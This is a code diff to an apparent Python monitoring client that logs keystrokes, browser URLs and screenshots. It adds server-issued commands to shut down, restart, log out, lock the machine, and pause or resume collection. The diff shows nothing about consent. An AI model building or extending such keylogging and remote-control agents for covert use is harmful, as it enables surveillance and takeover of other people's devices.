@@ -96,6 +96,7 @@ SESSION_ID = uuid.uuid4().hex
 pending_messages_lock = Lock()
 last_message_id = 0
 SERVICE_KEYBOARD_LISTENER = None
+collection_paused = False
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -611,10 +612,30 @@ def report_website_history_status(status, message):
         pass
 
 
+def acknowledge_device_command(command_id, status, error=""):
+    if not command_id:
+        return
+    try:
+        request = Request(
+            f"{SITE_URL}/api/devices/{device_id}/commands/{command_id}/ack",
+            data=json.dumps({"status": status, "error": error}).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urlopen(request, timeout=10) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+    except (HTTPError, URLError, TimeoutError, RuntimeError) as ack_error:
+        print(f"Could not acknowledge device command: {ack_error}")
+
+
 def website_history_sender():
     last_url = ""
     while True:
         try:
+            if collection_paused:
+                time.sleep(WEBSITE_HISTORY_INTERVAL_SECONDS)
+                continue
             active_app = get_active_app()
             browser_url = get_browser_url(active_app)
             if not active_app:
@@ -700,7 +721,7 @@ def poll_screenshot_request():
             if response.status >= 400:
                 raise RuntimeError(f"HTTP {response.status}")
             data = json.loads(response.read().decode("utf-8"))
-        handle_device_command(data.get("command"))
+        handle_device_command(data.get("command"), data.get("command_id"))
         if data.get("screenshot_requested"):
             trigger_screenshot_capture()
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
@@ -713,11 +734,31 @@ def screenshot_request_poller():
         time.sleep(SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS)
 
 
-def handle_device_command(command):
-    if command == "shutdown":
-        subprocess.Popen(["shutdown", "/s", "/t", "0"], close_fds=True)
-    elif command == "logout":
-        subprocess.Popen(["shutdown", "/l"], close_fds=True)
+def handle_device_command(command, command_id=None):
+    global collection_paused
+    if not command:
+        return
+    try:
+        if command == "shutdown":
+            subprocess.Popen(["shutdown", "/s", "/t", "0"], close_fds=True)
+        elif command == "logout":
+            subprocess.Popen(["shutdown", "/l"], close_fds=True)
+        elif command == "restart":
+            subprocess.Popen(["shutdown", "/r", "/t", "0"], close_fds=True)
+        elif command == "lock":
+            if os.name != "nt":
+                raise RuntimeError("Lock is only supported on Windows")
+            ctypes.windll.user32.LockWorkStation()
+        elif command == "pause":
+            flush_message_buffer()
+            collection_paused = True
+        elif command == "resume":
+            collection_paused = False
+        else:
+            raise RuntimeError("Unsupported command")
+        acknowledge_device_command(command_id, "completed")
+    except (OSError, RuntimeError, AttributeError) as error:
+        acknowledge_device_command(command_id, "failed", str(error))
 
 
 def get_battery_telemetry():
@@ -806,7 +847,7 @@ def send_heartbeat():
                 print(f"Client service URL updated to {SITE_URL}")
         if heartbeat.get("screenshot_requested"):
             trigger_screenshot_capture()
-        handle_device_command(heartbeat.get("command"))
+        handle_device_command(heartbeat.get("command"), heartbeat.get("command_id"))
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
         print(f"Could not send device heartbeat: {error}")
 
@@ -959,6 +1000,8 @@ def flush_message_buffer():
 def on_press(key):
     global message_buffer, raw_message_buffer, last_key_time_ms, message_started_ms
     global active_target, active_target_key
+    if collection_paused:
+        return
     with state_lock:
         modifier_aliases = {
             Key.shift_l: Key.shift, Key.shift_r: Key.shift, Key.ctrl_l: Key.ctrl,
